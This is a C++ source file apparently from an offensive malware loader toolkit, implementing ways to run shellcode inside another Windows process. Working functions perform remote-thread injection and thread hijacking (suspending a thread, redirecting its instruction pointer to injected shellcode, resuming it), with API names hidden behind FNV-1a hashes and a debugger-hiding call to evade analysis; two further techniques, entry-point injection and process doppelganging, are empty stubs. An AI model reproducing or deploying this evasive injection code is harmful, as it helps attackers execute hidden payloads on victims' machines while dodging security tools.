#include "execute.hpp"

namespace execute {
	//
	// Remote Thread Injection
	//
	BOOL CreateRemoteThreadInjection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		PVOID address_ptr = NULL;
		BOOL success = FALSE;
		HANDLE thread_handle = INVALID_HANDLE_VALUE;
		SIZE_T bytes_written = 0;
		HMODULE kernel32 = NULL;

#pragma region [Kernel32 Functions]

		typeGetLastError GetLastErrorC = NULL;
		typeVirtualFreeEx VirtualFreeExC = NULL;
		typeCreateRemoteThread CreateRemoteThreadC = NULL;
		typeWaitForSingleObject WaitForSingleObjectC = NULL;

		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_createremotethread = malapi::HashStringFowlerNollVoVariant1a("CreateRemoteThread");
		constexpr ULONG hash_waitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("WaitForSingleObject");
		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		if (kernel32 == NULL)
		{
			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
			goto CLEANUP;
		}

		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
		CreateRemoteThreadC = (typeCreateRemoteThread)malapi::GetProcAddressC(kernel32, hash_createremotethread);
		WaitForSingleObjectC = (typeWaitForSingleObject)malapi::GetProcAddressC(kernel32, hash_waitforsingleobject);
		VirtualFreeExC = (typeVirtualFreeEx)malapi::GetProcAddressC(kernel32, hash_virtualfreeex);

#pragma endregion

		address_ptr = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);

		thread_handle = CreateRemoteThreadC(process_handle, 0, 0, (LPTHREAD_START_ROUTINE)address_ptr, NULL, NULL, NULL);
		if (thread_handle == NULL)
		{
			LOG_ERROR("Error during CreateRemoteThread (Code: %08lX)", GetLastErrorC());
			goto CLEANUP;
		}
		else LOG_SUCCESS("Handle to Thread: 0x%08lX", thread_handle);
		success = TRUE;

		WaitForSingleObjectC(thread_handle, WAIT_FAILED);

	CLEANUP:
		if (process_handle)
		{
			VirtualFreeExC(process_handle, (LPVOID)address_ptr, 0, MEM_RELEASE);
		}
		return success;
	}

	//
	//Remote Thread Hijacking via Thread Enumeration
	//
	BOOL RemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;
		PVOID address_ptr = NULL;
		DWORD pid = 0;
		HANDLE proc_snapshot = NULL;
		HANDLE thread_handle = NULL;
		THREADENTRY32 thread_entry;
		CONTEXT context;

#pragma region [Kernel32 Functions]

		typeGetLastError GetLastErrorC = NULL;
		typeCloseHandle CloseHandleC = NULL;
		typeVirtualFreeEx VirtualFreeExC = NULL;
		typeGetProcessId GetProcessIdC = NULL;
		typeWaitForSingleObject WaitForSingleObjectC = NULL;
		typeOpenThread OpenThreadC = NULL;
		typeThread32First Thread32FirstC = NULL;
		typeThread32Next Thread32NextC = NULL;
		typeCreateToolhelp32Snapshot CreateToolhelp32SnapshotC = NULL;
		typeSuspendThread SuspendThreadC = NULL;
		typeResumeThread ResumeThreadC = NULL;
		typeGetThreadContext GetThreadContextC = NULL;
		typeSetThreadContext SetThreadContextC = NULL;

		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");
		constexpr ULONG hash_getprocessid = malapi::HashStringFowlerNollVoVariant1a("GetProcessId");
		constexpr ULONG hash_waitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("WaitForSingleObject");

		constexpr ULONG hash_createtoolhelp32snapshot = malapi::HashStringFowlerNollVoVariant1a("CreateToolhelp32Snapshot");
		constexpr ULONG hash_thread32first = malapi::HashStringFowlerNollVoVariant1a("Thread32First");
		constexpr ULONG hash_thread32next = malapi::HashStringFowlerNollVoVariant1a("Thread32Next");
		constexpr ULONG hash_openthread = malapi::HashStringFowlerNollVoVariant1a("OpenThread");
		constexpr ULONG hash_suspendthread = malapi::HashStringFowlerNollVoVariant1a("SuspendThread");
		constexpr ULONG hash_resumethread = malapi::HashStringFowlerNollVoVariant1a("ResumeThread");
		constexpr ULONG hash_gethreadcontext = malapi::HashStringFowlerNollVoVariant1a("GetThreadContext");
		constexpr ULONG hash_sethreadcontext = malapi::HashStringFowlerNollVoVariant1a("SetThreadContext");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		if (kernel32 == NULL)
		{
			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
			goto CLEANUP;
		}

		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);
		VirtualFreeExC = (typeVirtualFreeEx)malapi::GetProcAddressC(kernel32, hash_virtualfreeex);
		CreateToolhelp32SnapshotC = (typeCreateToolhelp32Snapshot)malapi::GetProcAddressC(kernel32, hash_createtoolhelp32snapshot);
		Thread32FirstC = (typeThread32First)malapi::GetProcAddressC(kernel32, hash_thread32first);
		Thread32NextC = (typeThread32Next)malapi::GetProcAddressC(kernel32, hash_thread32next);
		GetProcessIdC = (typeGetProcessId)malapi::GetProcAddressC(kernel32, hash_getprocessid);
		WaitForSingleObjectC = (typeWaitForSingleObject)malapi::GetProcAddressC(kernel32, hash_waitforsingleobject);
		OpenThreadC = (typeOpenThread)malapi::GetProcAddressC(kernel32, hash_openthread);
		SuspendThreadC = (typeSuspendThread)malapi::GetProcAddressC(kernel32, hash_suspendthread);
		ResumeThreadC = (typeResumeThread)malapi::GetProcAddressC(kernel32, hash_resumethread);
		GetThreadContextC = (typeGetThreadContext)malapi::GetProcAddressC(kernel32, hash_gethreadcontext);
		SetThreadContextC = (typeSetThreadContext)malapi::GetProcAddressC(kernel32, hash_sethreadcontext);

#pragma endregion

		context.ContextFlags = CONTEXT_FULL;
		thread_entry.dwSize = sizeof(THREADENTRY32);

		address_ptr = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);

		proc_snapshot = CreateToolhelp32SnapshotC(TH32CS_SNAPTHREAD, 0);
		LOG_INFO("Process Snapshot: %08lX", proc_snapshot);

		Thread32FirstC(proc_snapshot, &thread_entry);
		pid = GetProcessIdC(process_handle);

		if (pid != 0)
		{
			LOG_SUCCESS("Got PID: %d", pid);
		}

		while (Thread32NextC(proc_snapshot, &thread_entry))
		{
			if (thread_entry.th32OwnerProcessID == pid)
			{
				thread_handle = OpenThreadC(THREAD_ALL_ACCESS, FALSE, thread_entry.th32ThreadID);
				LOG_SUCCESS("Successfuly hijacked thread: %08lX", thread_handle);
				break;
			}
		}

		malapi::HideFromDebugger(thread_handle);

		if (!SuspendThreadC(thread_handle))
		{
			return LOG_ERROR("Failed to suspend thread. (Code: %08lX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Thread Suspended.");

		if (!GetThreadContextC(thread_handle, &context))
		{
			return LOG_ERROR("GetThreadContext Failed. (Code: %08lX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Got Thread Context.");

		context.Rip = (DWORD_PTR)address_ptr;
		if (!SetThreadContextC(thread_handle, &context))
		{
			return LOG_ERROR("SetThreadContext Failed. (Code: %08lX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Set Thread Context.");

		if (ResumeThreadC(thread_handle) == 0)
		{
			LOG_ERROR("Thread Failed to be resumed.");
			goto CLEANUP;
		}
		LOG_SUCCESS("Thread Resumed.");

		if (ResumeThreadC(thread_handle) == 0)
		{
			LOG_ERROR("Thread Failed to be resumed.");
			goto CLEANUP;
		}
		LOG_SUCCESS("Thread Resumed.");

		WaitForSingleObjectC(thread_handle, WAIT_FAILED);

		success = TRUE;

	CLEANUP:
		VirtualFreeExC(thread_handle, (LPVOID)address_ptr, 0, MEM_RELEASE);
		return success;
	}

	//
	// AddressOfEntryPoint Injection
	//
	BOOL AddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;
		HANDLE file_handle = INVALID_HANDLE_VALUE;
		PBYTE buffer = NULL;
		DWORD file_size = 0x00;
		DWORD bytes_read = 0x00;

		STARTUPINFO si = {};
		PROCESS_INFORMATION pi = {};
		SECURITY_ATTRIBUTES security_attribs = {};

#pragma region [Kernel32 Functions]

		typeGetLastError GetLastErrorC = NULL;
		typeCloseHandle CloseHandleC = NULL;
		typeCreateFileA CreateFileC = NULL;

		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
		constexpr ULONG hash_createfilea = malapi::HashStringFowlerNollVoVariant1a("CreateFileA");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		if (kernel32 == NULL)
		{
			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
			goto CLEANUP;
		}

		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);
		CreateFileC = (typeCreateFileA)malapi::GetProcAddressC(kernel32, hash_createfilea);

#pragma endregion

		success = TRUE;

	CLEANUP:
		// CloseHandleC(process_handle);
		// CloseHandleC(thread_handle);
		return success;
	}

	//
	// Process Doppleganging
	//
	BOOL Doppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;

#pragma region [Kernel32 Functions]

		typeGetLastError GetLastErrorC = NULL;
		typeCloseHandle CloseHandleC = NULL;

		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		if (kernel32 == NULL)
		{
			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
			goto CLEANUP;
		}

		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);

#pragma endregion

		success = TRUE;

	CLEANUP:
		// CloseHandleC(process_handle);
		// CloseHandleC(thread_handle);
		return success;
	}
} // End of execute namespace
